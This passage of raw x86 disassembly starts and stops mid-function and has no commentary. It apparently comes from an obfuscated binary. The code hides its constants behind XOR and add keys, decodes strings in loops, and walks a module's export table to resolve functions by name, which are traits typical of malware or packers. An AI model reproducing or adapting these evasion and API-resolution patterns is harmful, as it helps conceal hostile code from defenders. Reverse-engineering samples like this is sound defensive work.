  418ceb:	mov    al,BYTE PTR [edi]
  418ced:	add    al,0x8
  418cef:	xor    al,0x74
  418cf1:	cmp    al,0x7c
  418cf3:	je     0x418d56
  418cf5:	mov    eax,edi
  418cf7:	mov    edx,0xffcd8d1e
  418cfc:	mov    ecx,0x751089b
  418d01:	push   ebx
  418d02:	mov    ax,WORD PTR [eax]
  418d05:	mov    ebx,0x3b51
  418d0a:	sub    ax,bx
  418d0d:	mov    ebx,0x8a8d
  418d12:	xor    ax,bx
  418d15:	mov    ebx,0x4e50
  418d1a:	cmp    ax,bx
  418d1d:	jne    0x418d22
  418d1f:	mov    DWORD PTR [ebp-0x4],esi
  418d22:	lea    esi,[edx+0x1]
  418d25:	xor    esi,ecx
  418d27:	mov    edx,esi
  418d29:	xor    edx,ecx
  418d2b:	lea    eax,[edi+edx*2+0x64e5c4]
  418d32:	mov    bl,BYTE PTR [eax]
  418d34:	add    bl,0x8
  418d37:	xor    bl,0x74
  418d3a:	cmp    bl,0x7c
  418d3d:	jne    0x418d02
  418d3f:	mov    eax,DWORD PTR [ebp-0x4]
  418d42:	pop    ebx
  418d43:	cmp    eax,0xf89c8586
  418d48:	je     0x418d56
  418d4a:	xor    eax,ecx
  418d4c:	xor    ecx,ecx
  418d4e:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  418d56:	mov    eax,edi
  418d58:	pop    edi
  418d59:	pop    esi
  418d5a:	leave  
  418d5b:	ret    
  418d5c:	push   ebp
  418d5d:	mov    ebp,esp
  418d5f:	push   ecx
  418d60:	push   esi
  418d61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418d68:	mov    esi,0xf89c8585
  418d6d:	call   0x418c44
  418d72:	mov    cx,WORD PTR [eax]
  418d75:	mov    edx,0x3b51
  418d7a:	sub    cx,dx
  418d7d:	mov    edx,0x8a8d
  418d82:	xor    cx,dx
  418d85:	mov    edx,0x4e22
  418d8a:	cmp    cx,dx
  418d8d:	je     0x418de6
  418d8f:	push   ebx
  418d90:	push   edi
  418d91:	movzx  ecx,cx
  418d94:	mov    edx,0xffcd8d1e
  418d99:	mov    edi,0x751089b
  418d9e:	mov    ebx,0x4e50
  418da3:	cmp    cx,bx
  418da6:	jne    0x418dab
  418da8:	mov    DWORD PTR [ebp-0x4],esi
  418dab:	lea    esi,[edx+0x1]
  418dae:	xor    esi,edi
  418db0:	mov    edx,esi
  418db2:	xor    edx,edi
  418db4:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  418dbc:	mov    ebx,0x3b51
  418dc1:	sub    cx,bx
  418dc4:	mov    ebx,0x8a8d
  418dc9:	xor    cx,bx
  418dcc:	mov    ebx,0x4e22
  418dd1:	cmp    cx,bx
  418dd4:	jne    0x418d9e
  418dd6:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  418ddd:	pop    edi
  418dde:	pop    ebx
  418ddf:	je     0x418de6
  418de1:	xor    eax,eax
  418de3:	inc    eax
  418de4:	jmp    0x418de8
  418de6:	xor    eax,eax
  418de8:	pop    esi
  418de9:	leave  
  418dea:	ret    
  418deb:	push   ebp
  418dec:	mov    ebp,esp
  418dee:	push   ecx
  418def:	mov    eax,DWORD PTR [ebp+0x8]
  418df2:	movzx  ecx,WORD PTR [eax]
  418df5:	push   esi
  418df6:	lea    eax,[ecx-0x3b51]
  418dfc:	mov    esi,0x8a8d
  418e01:	push   edi
  418e02:	xor    eax,esi
  418e04:	mov    edi,0x4e22
  418e09:	mov    DWORD PTR [ebp-0x4],edx
  418e0c:	cmp    ax,di
  418e0f:	je     0x418e3c
  418e11:	mov    eax,DWORD PTR [ebp+0x8]
  418e14:	sub    eax,edx
  418e16:	mov    DWORD PTR [ebp+0x8],eax
  418e19:	jmp    0x418e1e
  418e1b:	mov    eax,DWORD PTR [ebp+0x8]
  418e1e:	mov    WORD PTR [edx],cx
  418e21:	add    edx,0x2
  418e24:	movzx  edi,WORD PTR [eax+edx*1]
  418e28:	mov    ecx,edi
  418e2a:	add    edi,0xffffc4af
  418e30:	xor    edi,esi
  418e32:	mov    eax,0x4e22
  418e37:	cmp    di,ax
  418e3a:	jne    0x418e1b
  418e3c:	xor    eax,eax
  418e3e:	pop    edi
  418e3f:	mov    WORD PTR [edx],ax
  418e42:	mov    eax,DWORD PTR [ebp-0x4]
  418e45:	pop    esi
  418e46:	leave  
  418e47:	ret    0x4
  418e4a:	push   ebp
  418e4b:	mov    ebp,esp
  418e4d:	sub    esp,0x18
  418e50:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  418e57:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418e5e:	mov    eax,DWORD PTR [ebp-0x14]
  418e61:	xor    eax,0x751089b
  418e66:	add    eax,0x3272e2
  418e6b:	mov    DWORD PTR [ebp-0x8],eax
  418e6e:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  418e75:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  418e7c:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  418e83:	mov    eax,DWORD PTR [ebp-0x14]
  418e86:	xor    eax,0x751089b
  418e8b:	mov    ecx,DWORD PTR [ebp-0x8]
  418e8e:	lea    eax,[ecx+eax*1+0x3272e2]
  418e95:	mov    ecx,DWORD PTR [ebp-0x18]
  418e98:	xor    ecx,0x751089b
  418e9e:	add    ecx,0x3272e2
  418ea4:	mov    edx,DWORD PTR [ebp+0x10]
  418ea7:	imul   edx,ecx
  418eaa:	cmp    eax,edx
  418eac:	jae    0x418f9f
  418eb2:	mov    eax,DWORD PTR [ebp+0x10]
  418eb5:	mov    ecx,DWORD PTR [ebp-0x8]
  418eb8:	sub    eax,ecx
  418eba:	mov    ecx,DWORD PTR [ebp-0x10]
  418ebd:	xor    ecx,0x751089b
  418ec3:	add    ecx,0x3272e2
  418ec9:	cmp    eax,ecx
  418ecb:	jbe    0x418efd
  418ecd:	mov    eax,DWORD PTR [ebp+0x8]
  418ed0:	add    eax,DWORD PTR [ebp-0x8]
  418ed3:	mov    ecx,DWORD PTR [ebp+0xc]
  418ed6:	add    ecx,DWORD PTR [ebp-0x8]
  418ed9:	mov    edx,DWORD PTR [ecx]
  418edb:	mov    DWORD PTR [eax],edx
  418edd:	mov    ecx,DWORD PTR [ecx+0x4]
  418ee0:	mov    DWORD PTR [eax+0x4],ecx
  418ee3:	mov    eax,DWORD PTR [ebp-0x10]
  418ee6:	xor    eax,0x751089b
  418eeb:	mov    ecx,DWORD PTR [ebp-0x8]
  418eee:	lea    eax,[ecx+eax*1+0x3272e2]
  418ef5:	mov    DWORD PTR [ebp-0x8],eax
  418ef8:	jmp    0x418f9a
  418efd:	mov    eax,DWORD PTR [ebp+0x10]
  418f00:	mov    ecx,DWORD PTR [ebp-0x8]
  418f03:	sub    eax,ecx
  418f05:	mov    ecx,DWORD PTR [ebp-0xc]
  418f08:	xor    ecx,0x751089b
  418f0e:	add    ecx,0x3272e2
  418f14:	cmp    eax,ecx
  418f16:	jbe    0x418f3f
  418f18:	mov    eax,DWORD PTR [ebp+0x8]
  418f1b:	add    eax,DWORD PTR [ebp-0x8]
  418f1e:	mov    ecx,DWORD PTR [ebp+0xc]
  418f21:	add    ecx,DWORD PTR [ebp-0x8]
  418f24:	mov    ecx,DWORD PTR [ecx]
  418f26:	mov    DWORD PTR [eax],ecx
  418f28:	mov    eax,DWORD PTR [ebp-0xc]
  418f2b:	xor    eax,0x751089b
  418f30:	mov    ecx,DWORD PTR [ebp-0x8]
  418f33:	lea    eax,[ecx+eax*1+0x3272e2]
  418f3a:	mov    DWORD PTR [ebp-0x8],eax
  418f3d:	jmp    0x418f9a
  418f3f:	mov    eax,DWORD PTR [ebp+0x10]
  418f42:	mov    ecx,DWORD PTR [ebp-0x8]
  418f45:	sub    eax,ecx
  418f47:	mov    ecx,DWORD PTR [ebp-0x4]
  418f4a:	xor    ecx,0x751089b
  418f50:	add    ecx,0x3272e2
  418f56:	cmp    eax,ecx
  418f58:	jbe    0x418f83
  418f5a:	mov    eax,DWORD PTR [ebp+0x8]
  418f5d:	add    eax,DWORD PTR [ebp-0x8]
  418f60:	mov    ecx,DWORD PTR [ebp+0xc]
  418f63:	add    ecx,DWORD PTR [ebp-0x8]
  418f66:	mov    cx,WORD PTR [ecx]
  418f69:	mov    WORD PTR [eax],cx
  418f6c:	mov    eax,DWORD PTR [ebp-0x4]
  418f6f:	xor    eax,0x751089b
  418f74:	mov    ecx,DWORD PTR [ebp-0x8]
  418f77:	lea    eax,[ecx+eax*1+0x3272e2]
  418f7e:	mov    DWORD PTR [ebp-0x8],eax
  418f81:	jmp    0x418f9a
  418f83:	mov    eax,DWORD PTR [ebp+0x8]
  418f86:	add    eax,DWORD PTR [ebp-0x8]
  418f89:	mov    ecx,DWORD PTR [ebp+0xc]
  418f8c:	add    ecx,DWORD PTR [ebp-0x8]
  418f8f:	mov    cl,BYTE PTR [ecx]
  418f91:	mov    BYTE PTR [eax],cl
  418f93:	mov    eax,DWORD PTR [ebp-0x8]
  418f96:	inc    eax
  418f97:	mov    DWORD PTR [ebp-0x8],eax
  418f9a:	jmp    0x418e83
  418f9f:	leave  
  418fa0:	ret    0xc
  418fa3:	push   ebp
  418fa4:	mov    ebp,esp
  418fa6:	sub    esp,0xc
  418fa9:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  418fb0:	push   esi
  418fb1:	mov    esi,eax
  418fb3:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418fba:	mov    edx,DWORD PTR [ebp-0x4]
  418fbd:	mov    eax,0x751089b
  418fc2:	xor    edx,eax
  418fc4:	mov    ecx,0x3272e2
  418fc9:	add    edx,ecx
  418fcb:	cmp    esi,edx
  418fcd:	je     0x41900f
  418fcf:	push   ebx
  418fd0:	push   edi
  418fd1:	mov    edx,DWORD PTR [ebp-0x8]
  418fd4:	mov    ebx,DWORD PTR [ebp+0x8]
  418fd7:	xor    edx,eax
  418fd9:	mov    edi,0xffcd8d1e
  418fde:	sub    edi,edx
  418fe0:	add    esi,edi
  418fe2:	lea    edx,[esi-0x3272e2]
  418fe8:	xor    edx,eax
  418fea:	mov    DWORD PTR [ebp-0xc],edx
  418fed:	mov    edx,DWORD PTR [ebp-0x4]
  418ff0:	mov    edi,DWORD PTR [ebp-0xc]
  418ff3:	xor    dl,0x9b
  418ff6:	sub    dl,0x1e
  418ff9:	xor    edi,eax
  418ffb:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  419002:	mov    edx,DWORD PTR [ebp-0x4]
  419005:	xor    edx,eax
  419007:	add    edx,ecx
  419009:	cmp    esi,edx
  41900b:	jne    0x418fd1
  41900d:	pop    edi
  41900e:	pop    ebx
  41900f:	pop    esi
  419010:	leave  
  419011:	ret    0x4
  419014:	push   ebp
  419015:	mov    ebp,esp
  419017:	sub    esp,0x21c
  41901d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  419024:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41902b:	mov    eax,DWORD PTR [ebp+0x10]
  41902e:	mov    eax,DWORD PTR [ebp-0x4]
  419031:	mov    ecx,DWORD PTR [ebp+0x8]
  419034:	push   esi
  419035:	push   edi
  419036:	mov    edi,0x751089b
  41903b:	xor    eax,edi
  41903d:	mov    esi,0x3272e2
  419042:	add    eax,esi
  419044:	cmp    eax,ecx
  419046:	mov    eax,DWORD PTR [ebp-0x4]
  419049:	jne    0x419054
  41904b:	xor    eax,edi
  41904d:	add    eax,esi
  41904f:	jmp    0x419100
  419054:	mov    ecx,DWORD PTR [ebp+0xc]
  419057:	xor    eax,edi
  419059:	add    eax,esi
  41905b:	cmp    eax,ecx
  41905d:	jne    0x419064
  41905f:	mov    eax,DWORD PTR [ebp-0x4]
  419062:	jmp    0x41904b
  419064:	lea    eax,[ebp-0x21c]
  41906a:	mov    DWORD PTR [ebp-0x8],eax
  41906d:	mov    eax,DWORD PTR [ebp+0xc]
  419070:	mov    DWORD PTR [ebp-0x10],eax
  419073:	mov    eax,DWORD PTR [ebp-0x4]
  419076:	xor    eax,edi
  419078:	add    eax,esi
  41907a:	mov    DWORD PTR [ebp+0x10],eax
  41907d:	mov    eax,DWORD PTR [ebp+0xc]
  419080:	push   ebx
  419081:	call   0x418d5c
  419086:	mov    ebx,eax
  419088:	mov    eax,DWORD PTR [ebp+0x8]
  41908b:	mov    eax,DWORD PTR [eax+0x14]
  41908e:	jmp    0x4190e8
  419090:	mov    eax,DWORD PTR [ebp+0xc]
  419093:	sub    eax,0x8
  419096:	mov    DWORD PTR [ebp-0xc],eax
  419099:	mov    eax,DWORD PTR [ebp-0xc]
  41909c:	mov    eax,DWORD PTR [eax+0x28]
  41909f:	call   0x418c44
  4190a4:	mov    DWORD PTR [ebp+0x10],eax
  4190a7:	push   DWORD PTR [ebp+0x10]
  4190aa:	mov    edx,DWORD PTR [ebp-0x8]
  4190ad:	call   0x418deb
  4190b2:	mov    eax,DWORD PTR [ebp-0x4]
  4190b5:	xor    eax,edi
  4190b7:	add    eax,esi
  4190b9:	cmp    eax,ebx
  4190bb:	jne    0x4190c5
  4190bd:	mov    eax,DWORD PTR [ebp-0x8]
  4190c0:	call   0x418cd2
  4190c5:	mov    eax,DWORD PTR [ebp-0x14]
  4190c8:	xor    eax,edi
  4190ca:	add    eax,esi
  4190cc:	push   eax
  4190cd:	push   DWORD PTR [ebp-0x10]
  4190d0:	mov    eax,DWORD PTR [ebp-0x8]
  4190d3:	call   0x4189fe
  4190d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4190db:	xor    ecx,edi
  4190dd:	add    ecx,esi
  4190df:	cmp    eax,ecx
  4190e1:	je     0x419106
  4190e3:	mov    eax,DWORD PTR [ebp+0xc]
  4190e6:	mov    eax,DWORD PTR [eax]
  4190e8:	mov    DWORD PTR [ebp+0xc],eax
  4190eb:	mov    eax,DWORD PTR [ebp+0x8]
  4190ee:	mov    ecx,DWORD PTR [ebp+0xc]
  4190f1:	add    eax,0x14
  4190f4:	cmp    ecx,eax
  4190f6:	jne    0x419090
  4190f8:	mov    eax,DWORD PTR [ebp-0x4]
  4190fb:	xor    eax,edi
  4190fd:	add    eax,esi
  4190ff:	pop    ebx
  419100:	pop    edi
  419101:	pop    esi
  419102:	leave  
  419103:	ret    0xc
  419106:	mov    eax,DWORD PTR [ebp-0xc]
  419109:	mov    eax,DWORD PTR [eax+0x18]
  41910c:	jmp    0x4190ff
  41910e:	push   ebp
  41910f:	mov    ebp,esp
  419111:	mov    eax,DWORD PTR [ebp+0xc]
  419114:	sub    esp,0x10
  419117:	cmp    DWORD PTR [ebp+0x8],0x0
  41911b:	push   ebx
  41911c:	push   esi
  41911d:	push   edi
  41911e:	je     0x4191d3
  419124:	test   eax,eax
  419126:	je     0x4191d3
  41912c:	movzx  eax,WORD PTR [eax+0x20]
  419130:	mov    ecx,eax
  419132:	mov    DWORD PTR [ebp-0x10],eax
  419135:	xor    edx,edx
  419137:	and    DWORD PTR [ebp-0x8],edx
  41913a:	mov    eax,0x8a8d
  41913f:	xor    ecx,eax
  419141:	add    ecx,0x3b51
  419147:	mov    DWORD PTR [ebp-0xc],ecx
  41914a:	and    DWORD PTR [ebp-0x4],0x0
  41914e:	xor    ecx,ecx
  419150:	push   0x7e
  419152:	pop    edi
  419153:	cmp    cx,WORD PTR [ebp-0xc]
  419157:	jae    0x4191bd
  419159:	lea    esi,[edx-0x3b51]
  41915f:	xor    esi,eax
  419161:	movzx  ecx,WORD PTR [ebp-0x4]
  419165:	mov    ebx,DWORD PTR [ebp+0xc]
  419168:	lea    ecx,[ebx+ecx*4]
  41916b:	cmp    WORD PTR [ecx+0x2],si
  41916f:	jne    0x4191a8
  419171:	movzx  ecx,WORD PTR [ecx]
  419174:	mov    edi,0x4e22
  419179:	cmp    cx,di
  41917c:	jne    0x41918a
  41917e:	mov    ebx,DWORD PTR [ebp+0x8]
  419181:	movzx  edi,dx
  419184:	cmp    BYTE PTR [edi+ebx*1],0x0
  419188:	je     0x4191b7
  41918a:	mov    ebx,DWORD PTR [ebp+0x8]
  41918d:	movzx  edi,dx
  419190:	movsx  di,BYTE PTR [edi+ebx*1]
  419195:	mov    ebx,0x3b51
  41919a:	sub    di,bx
  41919d:	xor    di,ax
  4191a0:	cmp    cx,di
  4191a3:	je     0x4191b7
  4191a5:	push   0x7c
  4191a7:	pop    edi
  4191a8:	inc    DWORD PTR [ebp-0x4]
  4191ab:	mov    cx,WORD PTR [ebp-0xc]
  4191af:	cmp    WORD PTR [ebp-0x4],cx
  4191b3:	jb     0x419161
  4191b5:	jmp    0x4191bd
  4191b7:	inc    DWORD PTR [ebp-0x8]
  4191ba:	push   0x7d
  4191bc:	pop    edi
  4191bd:	mov    esi,DWORD PTR [ebp+0x8]
  4191c0:	movzx  ecx,dx
  4191c3:	cmp    BYTE PTR [ecx+esi*1],0x0
  4191c7:	je     0x4191dc
  4191c9:	inc    edx
  4191ca:	cmp    edi,0x7c
  4191cd:	jne    0x41914a
  4191d3:	xor    eax,eax
  4191d5:	pop    edi
  4191d6:	pop    esi
  4191d7:	pop    ebx
  4191d8:	leave  
  4191d9:	ret    0x8
  4191dc:	mov    ecx,DWORD PTR [ebp-0x8]
  4191df:	add    ecx,0xffffc4af
  4191e5:	xor    cx,ax
  4191e8:	xor    eax,eax
  4191ea:	cmp    cx,WORD PTR [ebp-0x10]
  4191ee:	sete   al
  4191f1:	jmp    0x4191d5
  4191f3:	push   ebp
  4191f4:	mov    ebp,esp
  4191f6:	sub    esp,0x50
  4191f9:	push   edi
  4191fa:	mov    edi,eax
  4191fc:	mov    eax,DWORD PTR [edi+0x1a8]
  419202:	cmp    DWORD PTR [eax],0x0
  419205:	jne    0x41920e
  419207:	xor    eax,eax
  419209:	jmp    0x41933f
  41920e:	push   DWORD PTR [ebp+0x8]
  419211:	push   0x2c
  419213:	pop    eax
  419214:	call   0x418fa3
  419219:	mov    edx,DWORD PTR [edi+0x1ac]
  41921f:	lea    eax,[edi+0x22]
  419222:	mov    DWORD PTR [ebp-0x4c],eax
  419225:	lea    eax,[edi+0x44]
  419228:	mov    DWORD PTR [ebp-0x48],eax
  41922b:	lea    eax,[edi+0x66]
  41922e:	mov    DWORD PTR [ebp-0x44],eax
  419231:	lea    eax,[edi+0x88]
  419237:	mov    DWORD PTR [ebp-0x40],eax
  41923a:	lea    eax,[edi+0xaa]
  419240:	mov    DWORD PTR [ebp-0x3c],eax
  419243:	lea    eax,[edi+0xcc]
  419249:	mov    DWORD PTR [ebp-0x38],eax
  41924c:	lea    eax,[edi+0xee]
  419252:	mov    DWORD PTR [ebp-0x34],eax
  419255:	lea    eax,[edi+0x110]
  41925b:	mov    DWORD PTR [ebp-0x30],eax
  41925e:	lea    eax,[edi+0x132]
  419264:	mov    DWORD PTR [ebp-0x2c],eax
  419267:	lea    eax,[edi+0x154]
  41926d:	push   edi
  41926e:	mov    DWORD PTR [ebp-0x50],edi
  419271:	mov    DWORD PTR [ebp-0x28],eax
  419274:	call   0x419373
  419279:	push   eax
  41927a:	mov    eax,DWORD PTR [edi+0x1a8]
  419280:	push   DWORD PTR [eax]
  419282:	call   0x419014
  419287:	mov    DWORD PTR [ebp-0x10],eax
  41928a:	test   eax,eax
  41928c:	je     0x41933f
  419292:	mov    ecx,DWORD PTR [eax+0x3c]
  419295:	push   ebx
  419296:	push   esi
  419297:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41929b:	add    esi,eax
  41929d:	mov    edi,DWORD PTR [esi+0x24]
  4192a0:	mov    ecx,DWORD PTR [esi+0x1c]
  4192a3:	mov    edx,DWORD PTR [esi+0x20]
  4192a6:	mov    ebx,DWORD PTR [esi+0x18]
  4192a9:	add    edi,eax
  4192ab:	mov    DWORD PTR [ebp-0x20],edi
  4192ae:	mov    edi,DWORD PTR [esi+0x14]
  4192b1:	add    ecx,eax
  4192b3:	add    edx,eax
  4192b5:	mov    DWORD PTR [ebp-0xc],ecx
  4192b8:	mov    DWORD PTR [ebp-0x1c],edx
  4192bb:	mov    DWORD PTR [ebp-0x8],edi
  4192be:	cmp    edi,ebx
  4192c0:	ja     0x4192c5
  4192c2:	mov    DWORD PTR [ebp-0x8],ebx
  4192c5:	xor    ebx,ebx
  4192c7:	mov    DWORD PTR [ebp-0x18],ebx
  4192ca:	cmp    DWORD PTR [ebp-0x8],ebx
  4192cd:	jbe    0x41933d
  4192cf:	jmp    0x4192d4
  4192d1:	mov    edx,DWORD PTR [ebp-0x1c]
  4192d4:	mov    edi,DWORD PTR [ebp-0x20]
  4192d7:	movzx  edi,WORD PTR [edi+ebx*2]
  4192db:	cmp    ebx,DWORD PTR [esi+0x18]
  4192de:	jae    0x41933d
  4192e0:	cmp    edi,DWORD PTR [esi+0x14]
  4192e3:	jae    0x41933d
  4192e5:	mov    ebx,DWORD PTR [edx+ebx*4]
  4192e8:	mov    edx,DWORD PTR [ebp+0x8]
  4192eb:	mov    edi,DWORD PTR [ecx+edi*4]
  4192ee:	mov    DWORD PTR [ebp-0x4],edx
  4192f1:	lea    edx,[ebp-0x50]
  4192f4:	add    ebx,eax
  4192f6:	add    edi,eax
  4192f8:	sub    edx,DWORD PTR [ebp+0x8]
  4192fb:	mov    DWORD PTR [ebp-0x14],0xb
  419302:	mov    DWORD PTR [ebp-0x24],edx
  419305:	mov    edx,DWORD PTR [ebp-0x4]
  419308:	cmp    DWORD PTR [edx],0x0
  41930b:	jne    0x419328
  41930d:	mov    eax,DWORD PTR [ebp-0x24]
  419310:	push   DWORD PTR [eax+edx*1]
  419313:	push   ebx
  419314:	call   0x41910e
  419319:	mov    ecx,DWORD PTR [ebp-0xc]
  41931c:	test   eax,eax
  41931e:	je     0x419325
  419320:	mov    eax,DWORD PTR [ebp-0x4]
  419323:	mov    DWORD PTR [eax],edi
  419325:	mov    eax,DWORD PTR [ebp-0x10]
  419328:	add    DWORD PTR [ebp-0x4],0x4
  41932c:	dec    DWORD PTR [ebp-0x14]
  41932f:	jne    0x419305
  419331:	mov    ebx,DWORD PTR [ebp-0x18]
  419334:	inc    ebx
  419335:	mov    DWORD PTR [ebp-0x18],ebx
  419338:	cmp    ebx,DWORD PTR [ebp-0x8]
  41933b:	jb     0x4192d1
  41933d:	pop    esi
  41933e:	pop    ebx
  41933f:	pop    edi
  419340:	leave  
  419341:	ret    0x4
  419344:	push   ebp
  419345:	mov    ebp,esp
  419347:	mov    eax,DWORD PTR [ebp+0x8]
  41934a:	push   esi
  41934b:	push   DWORD PTR [eax+0x1d8]
  419351:	lea    esi,[eax+0x198]
  419357:	mov    eax,DWORD PTR [ebp+0x8]
  41935a:	call   0x4191f3
  41935f:	mov    ecx,DWORD PTR [esi]
  419361:	mov    DWORD PTR [ecx],eax
  419363:	mov    eax,DWORD PTR [esi]
  419365:	xor    ecx,ecx
  419367:	cmp    DWORD PTR [eax],ecx
  419369:	pop    esi
  41936a:	setne  cl
  41936d:	mov    eax,ecx
  41936f:	pop    ebp
  419370:	ret    0x4
  419373:	mov    ecx,DWORD PTR [edi+0x188]
  419379:	push   ebx
  41937a:	jmp    0x41938f
  41937c:	xor    eax,0x8a8d
  419381:	add    eax,0x3b51
  419386:	mov    WORD PTR [ecx],ax
  419389:	add    ecx,0x2
  41938c:	add    edx,0x2
  41938f:	movzx  eax,WORD PTR [edx]
  419392:	mov    ebx,0x4e22
  419397:	cmp    ax,bx
  41939a:	jne    0x41937c
  41939c:	xor    eax,eax
  41939e:	mov    WORD PTR [ecx],ax
  4193a1:	mov    eax,DWORD PTR [edi+0x188]
  4193a7:	pop    ebx
  4193a8:	ret    
  4193a9:	push   edi
  4193aa:	mov    edi,eax
  4193ac:	mov    eax,DWORD PTR [esi+0x188]
  4193b2:	shl    edi,0x6
  4193b5:	add    eax,edi
  4193b7:	jmp    0x4193c3
  4193b9:	xor    cl,0x74
  4193bc:	sub    cl,0x8
  4193bf:	mov    BYTE PTR [eax],cl
  4193c1:	inc    eax
  4193c2:	inc    edx
  4193c3:	mov    cl,BYTE PTR [edx]
  4193c5:	cmp    cl,0x7c
  4193c8:	jne    0x4193b9
  4193ca:	mov    BYTE PTR [eax],0x0
  4193cd:	mov    eax,DWORD PTR [esi+0x188]
  4193d3:	add    eax,edi
  4193d5:	pop    edi
  4193d6:	ret    
  4193d7:	push   ebp
  4193d8:	mov    ebp,esp
  4193da:	sub    esp,0x38
  4193dd:	push   ebx
  4193de:	mov    ebx,0xf89c8585
  4193e3:	mov    DWORD PTR [ebp-0x4],ebx
  4193e6:	lea    eax,[ebx-0x1]
  4193e9:	push   esi
  4193ea:	mov    DWORD PTR [ebp-0x24],eax
  4193ed:	mov    ecx,DWORD PTR [ebp-0x4]
  4193f0:	mov    edx,DWORD PTR [ebp+0x8]
  4193f3:	mov    esi,0x751089b
  4193f8:	push   edi
  4193f9:	xor    ecx,esi
  4193fb:	mov    edi,0x3272e2
  419400:	add    ecx,edi
  419402:	cmp    edx,ecx
  419404:	je     0x419572
  41940a:	mov    ecx,DWORD PTR [ebp-0x4]
  41940d:	mov    edx,DWORD PTR [ebp+0xc]
  419410:	xor    ecx,esi
  419412:	add    ecx,edi
  419414:	cmp    edx,ecx
  419416:	je     0x419572
  41941c:	mov    ecx,DWORD PTR [ebp+0x10]
  41941f:	mov    DWORD PTR [ebp-0x18],ecx
  419422:	mov    ecx,DWORD PTR [ebp+0xc]
  419425:	mov    DWORD PTR [ebp-0x14],ecx
  419428:	mov    ecx,DWORD PTR [ebp+0x8]
  41942b:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  419432:	mov    DWORD PTR [ebp-0x20],eax
  419435:	mov    DWORD PTR [ebp-0x10],ebx
  419438:	mov    DWORD PTR [ebp+0xc],eax
  41943b:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  419442:	mov    eax,DWORD PTR [ebp+0xc]
  419445:	mov    DWORD PTR [ebp-0xc],ecx
  419448:	xor    eax,esi
  41944a:	mov    ecx,0xffcd8d1e
  41944f:	sub    ecx,eax
  419451:	add    ecx,DWORD PTR [ebp-0x14]
  419454:	mov    DWORD PTR [ebp+0x8],ecx
  419457:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41945e:	jmp    0x419562
  419463:	mov    eax,DWORD PTR [ebp+0xc]
  419466:	mov    ecx,DWORD PTR [ebp+0xc]
  419469:	xor    eax,esi
  41946b:	xor    ecx,esi
  41946d:	lea    ecx,[eax+ecx*1+0x64e5c4]
  419474:	mov    eax,DWORD PTR [ebp+0x8]
  419477:	xor    edx,edx
  419479:	div    ecx
  41947b:	mov    eax,DWORD PTR [ebp+0x10]
  41947e:	mov    ecx,DWORD PTR [ebp+0xc]
  419481:	xor    eax,esi
  419483:	xor    ecx,esi
  419485:	sub    eax,ecx
  419487:	cmp    edx,eax
  419489:	jne    0x41951e
  41948f:	mov    eax,DWORD PTR [ebp+0x8]
  419492:	add    eax,DWORD PTR [ebp-0xc]
  419495:	mov    dl,BYTE PTR [eax]
  419497:	mov    eax,DWORD PTR [ebp-0x10]
  41949a:	mov    ecx,DWORD PTR [ebp-0x8]
  41949d:	xor    eax,esi
  41949f:	xor    ecx,esi
  4194a1:	add    eax,edi
  4194a3:	add    ecx,edi
  4194a5:	cmp    eax,ecx
  4194a7:	jae    0x4194ef
  4194a9:	lea    ecx,[eax-0x3272e2]
  4194af:	mov    DWORD PTR [ebp-0x4],ecx
  4194b2:	mov    ebx,DWORD PTR [ebp-0x4]
  4194b5:	xor    ebx,esi
  4194b7:	add    ebx,0x7f55d8fb
  4194bd:	lea    ecx,[ebp+eax*4-0x38]
  4194c1:	mov    DWORD PTR [ecx],ebx
  4194c3:	mov    ebx,DWORD PTR [ecx]
  4194c5:	cmp    ebx,0x244ecbda
  4194cb:	jbe    0x4194d5
  4194cd:	add    DWORD PTR [ecx],0x405fc19
  4194d3:	jmp    0x4194db
  4194d5:	add    DWORD PTR [ecx],0xfdaf43e7
  4194db:	mov    ecx,DWORD PTR [ebp-0x8]
  4194de:	xor    ecx,esi
  4194e0:	inc    eax
  4194e1:	inc    DWORD PTR [ebp-0x4]
  4194e4:	add    ecx,edi
  4194e6:	cmp    eax,ecx
  4194e8:	jb     0x4194b2
  4194ea:	mov    ebx,0xf89c8585
  4194ef:	mov    eax,DWORD PTR [ebp-0x18]
  4194f2:	test   eax,eax
  4194f4:	jne    0x4194fe
  4194f6:	xor    dl,0x74
  4194f9:	sub    dl,0x8
  4194fc:	jmp    0x419514
  4194fe:	mov    eax,DWORD PTR [ebp-0x1c]
  419501:	xor    al,0x9b
  419503:	mov    cl,0x1e
  419505:	sub    cl,al
  419507:	add    dl,cl
  419509:	mov    ecx,DWORD PTR [ebp-0x20]
  41950c:	xor    cl,0x9b
  41950f:	sub    cl,0x1e
  419512:	ror    dl,cl
  419514:	xor    eax,eax
  419516:	mov    eax,DWORD PTR [ebp+0x8]
  419519:	add    eax,DWORD PTR [ebp-0xc]
  41951c:	mov    BYTE PTR [eax],dl
  41951e:	mov    eax,DWORD PTR [ebp+0x8]
  419521:	mov    ecx,DWORD PTR [ebp-0x10]
  419524:	sub    eax,edi
  419526:	xor    eax,esi
  419528:	cmp    eax,ecx
  41952a:	jne    0x419550
  41952c:	mov    eax,DWORD PTR [ebp+0x10]
  41952f:	mov    ecx,DWORD PTR [ebp+0xc]
  419532:	xor    eax,esi
  419534:	xor    ecx,esi
  419536:	sub    eax,ecx
  419538:	sub    eax,edi
  41953a:	xor    eax,esi
  41953c:	mov    DWORD PTR [ebp+0x10],eax
  41953f:	mov    eax,DWORD PTR [ebp+0xc]
  419542:	xor    eax,esi
  419544:	mov    ecx,0xffcd8d1e
  419549:	sub    ecx,eax
  41954b:	add    ecx,DWORD PTR [ebp-0x14]
  41954e:	jmp    0x41955f
